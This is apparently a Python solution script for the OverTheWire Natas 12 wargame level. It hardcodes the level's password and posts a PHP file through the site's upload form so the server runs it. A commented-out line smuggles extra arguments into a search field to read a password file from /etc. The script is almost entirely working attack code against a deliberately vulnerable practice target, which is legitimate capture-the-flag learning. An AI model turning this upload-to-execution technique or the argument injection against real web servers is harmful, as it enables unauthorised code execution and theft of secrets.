#!/usr/bin/env python

import requests
import json

# We need to exploit the upload function. We can add anything that'll run in apache
# user permissions dont let us look outside of the dir

NATAS = "natas12"
PASS = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
URL = "http://" + NATAS + ".natas.labs.overthewire.org"
# jar = requests.cookies.RequestsCookieJar()
files = {'uploadedfile': open('template.php')}
payload = {
    'filename': 'template.php'
}
r = requests.post(URL , auth=(NATAS, PASS), files=files, data=payload)
#r = requests.post(URL , auth=(NATAS, PASS), data={'needle': '-v test /etc/natas_webpass/natas11 ', 'submit': True })
print(r.text)
print(r.history)
print(r.status_code)


print(r.headers)
